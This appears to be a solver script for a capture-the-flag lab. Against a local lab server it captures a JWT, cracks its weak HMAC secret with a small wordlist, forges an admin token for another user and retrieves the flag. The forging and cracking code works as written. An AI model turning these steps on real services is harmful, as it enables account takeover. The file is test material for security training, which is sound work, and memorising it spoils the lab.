#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/weak-hmac (WeakHMAC).
 *
 * Intended path: log in as a tester → capture an HS256 token → discover the
 * innocent account via GET /api/directory → "crack" the weak human-chosen
 * HMAC secret offline (dictionary attack against the captured signature —
 * the lab changelog admits the intern picked it) → re-sign the gated claim
 * pair (sub=<innocent>, role=admin) and claim the flag at GET /flag/jwt.
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-WeakHMAC-\d+\}/ flag.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-WeakHMAC-\d+\}$/;
const PROFILE = 'dsltv-jwt-weak-hmac';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
const hs256 = (header, payload, secret) => {
  const h = b64u(header), p = b64u(payload);
  const s = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  return `${h}.${p}.${s}`;
};

/* the "offline crack": candidate secrets walked against the captured signature */
const CANDIDATES = ['secret', 'password', 'jwt-secret', 'changeme', 'letmein',
  'super-secret', 'hunter2', 'flag-hunter', 's3cr3t', 'test'];

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester → capture an HS256 token */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec — captured HS256 token (${lj.token.length} chars)`);

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. offline dictionary attack against the captured signature */
  const [h, p, s] = lj.token.split('.');
  let cracked = null;
  for (const cand of CANDIDATES) {
    const sig = crypto.createHmac('sha256', cand).update(`${h}.${p}`).digest('base64url');
    if (sig === s) { cracked = cand; break; }
  }
  if (!cracked) fail('weak-secret wordlist exhausted — the HMAC secret was not found (lab changed?)');
  ok(`weak HMAC secret cracked offline: "${cracked}"`);

  /* 4. re-sign the gated claim pair with the cracked secret */
  const forged = hs256({ alg: 'HS256', typ: 'JWT' },
    { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) }, cracked);
  ok('forged HS256 token with the gated claim pair (verification itself is correct — the secret was the flaw)');

  /* 5. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
